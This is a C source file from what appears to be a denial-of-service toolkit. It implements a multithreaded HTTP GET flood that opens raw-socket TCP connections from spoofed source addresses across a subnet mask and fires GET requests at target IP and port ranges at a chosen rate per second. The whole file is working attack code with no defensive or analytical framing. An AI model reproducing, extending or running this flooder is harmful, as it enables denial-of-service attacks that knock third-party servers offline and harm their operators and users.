#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/get_flood.h"

#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"

extern int g_num_threads;

// session counting
__u64 g_get_num_total;
__u64 g_get_num_generated_in_sec;
// from main()
InputArguments g_get_input;
__u32 g_get_request_per_sec;
// for masking next ip address
MaskingArguments g_get_now;
// thread
pthread_mutex_t g_get_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_get_cond = PTHREAD_COND_INITIALIZER;

// time checking
struct timespec g_get_before_time;
struct timespec g_get_now_time;
// request msg
char g_get_request_msg[__GET_REQUEST_MSG_SIZE__ ];

void get_flood_print_usage(void)
{
	printf(
			"get flood Usage : "
			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_get_flood(void *data)
{
	srand(time(NULL));
	int thread_id = *((int*) data);

	clock_t thread_clock;
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_get_mutex);
		// wait a second
		if (g_get_num_generated_in_sec >= g_get_request_per_sec) {
			pthread_cond_wait(&g_get_cond, &g_get_mutex);
		}
		// get now resource
		get_masking_arguments(&g_get_input, &g_get_now);
		// make and do tcp connection using raw socket
		int src_port, seq, ack;
		int sock = tcp_make_connection(
				inet_addr(g_get_now.src),
				inet_addr(g_get_now.dest),
				&src_port,
				g_get_now.port,
				&seq,
				&ack,
				0);
		// send HTTP GET method
		tcp_socket_send_data(
				sock,
				inet_addr(g_get_now.src),
				inet_addr(g_get_now.dest),
				src_port,
				g_get_now.port,
				GET_METHOD,
				strlen(GET_METHOD),
				seq,
				ack,
				0);
		// time checking
		time_check(
				&g_get_cond,
				&g_get_before_time,
				&g_get_now_time,
				&g_get_num_generated_in_sec);
		// session count
		g_get_num_generated_in_sec++;
		g_get_num_total++;
		close(sock);
		// *** end of critical section ***
		pthread_mutex_unlock(&g_get_mutex);
	}
	return NULL;
}

void *get_flood_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_get_mutex);
		time_check(
				&g_get_cond,
				&g_get_before_time,
				&g_get_now_time,
				&g_get_num_generated_in_sec);
		pthread_mutex_unlock(&g_get_mutex);
	}
	return NULL;
}

void get_flood_main(char *argv[])
{
	strcpy(g_get_request_msg, GET_METHOD);
	printf("Requesting: \n%s\n", g_get_request_msg);
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		get_flood_print_usage();
		return;
	}
	argv_to_input_arguments(argv, &g_get_input);
	g_get_num_generated_in_sec = 0;
	g_get_num_total = 0;
	memset(&g_get_before_time, 0, sizeof(struct timespec));
	memset(&g_get_now_time, 0, sizeof(struct timespec));
	g_get_request_per_sec = atoi(argv[3]);
	const int num_threads = g_num_threads;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Sending GET requests to %s using %d threads %u per sec\n",
			g_get_input.dest, num_threads, g_get_request_per_sec);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(
				&threads[i],
				NULL,
				generate_get_flood,
				(void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, get_flood_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("threads %d joined\n", i);
	}
	pthread_mutex_destroy(&g_get_mutex);
	printf("GET flood finished\nTotal %lu packets sent.\n", g_get_num_total);
	pthread_exit(NULL);
	return;
}
